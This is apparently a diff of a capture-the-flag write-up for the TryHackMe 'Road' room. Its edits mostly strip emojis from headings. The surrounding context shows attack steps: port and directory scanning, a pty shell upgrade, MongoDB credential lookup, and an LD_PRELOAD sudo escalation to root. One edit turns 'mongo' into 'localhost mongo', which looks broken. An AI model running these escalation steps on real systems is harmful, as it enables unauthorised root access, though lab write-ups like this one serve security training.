@@ -1,16 +1,15 @@
 # TryHackMe — Road (Medium) Write-up
 
-## 📝 Overview
+##  Overview
 - **Room:** Road  
 - **Difficulty:** Medium  
-- **Date:** 12.09.2025  
 - **Target IP:** xxx.xxx.xxx.xxx  
 
 In this room, I exploited a vulnerable web application and leveraged a misconfigured MongoDB service to gain SSH access, finally escalating privileges to root through an LD_PRELOAD misconfiguration.  
 
 ---
 
-## 🔎 Enumeration
+##  Enumeration
 We start with a full port scan:  
 
 ```bash
@@ -23,7 +22,7 @@ sudo nmap -sC -sV -Pn -p- xxx.xxx.xxx.xxx
 
 ---
 
-## 🌐 Web Enumeration
+##  Web Enumeration
 On port 80, the website displayed a basic "Sky" page.  
 
 Directory brute force with Gobuster:  
@@ -39,7 +38,7 @@ gobuster dir -u http://xxx.xxx.xxx.xxx -w /usr/share/wordlists/dirb/common.txt
 
 ---
 
-## 🔓 Exploitation
+##  Exploitation
 At `/v2/admin/login.html`, I found a login form with registration enabled.  
 
 ### Step 1 — Registration
@@ -73,7 +72,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 ---
 
-## ⚙️ Privilege Escalation
+##  Privilege Escalation
 
 ### Step 1 — www-data → webdeveloper
 I uploaded **LinPEAS**:  
@@ -87,7 +86,7 @@ chmod +x linpeas.sh
 It revealed MongoDB. Connected locally:  
 
 ```bash
-mongo
+localhost mongo
 show databases
 use backup
 db.user.find()
@@ -136,11 +135,11 @@ Run:
 sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
 
-→ Root shell obtained 🎉  
+→ Root shell obtained  
 
 ---
 
-## 🎯 Flags
+##  Flags
 ```bash
 cat /home/webdeveloper/user.txt
 ```
@@ -153,7 +152,7 @@ cat /root/root.txt
 
 ---
 
-## ✅ Lessons Learned
+##  Lessons Learned
 - Always validate password reset logic.  
 - Sanitize and restrict file uploads.  
 - Do not expose MongoDB without authentication.  
@@ -161,7 +160,7 @@ cat /root/root.txt
 
 ---
 
-## 🔚 Conclusion
+##  Conclusion
 This machine clearly demonstrates **attack chaining**:  
 1. Weak password reset → admin access  
 2. File upload → RCE (www-data)  
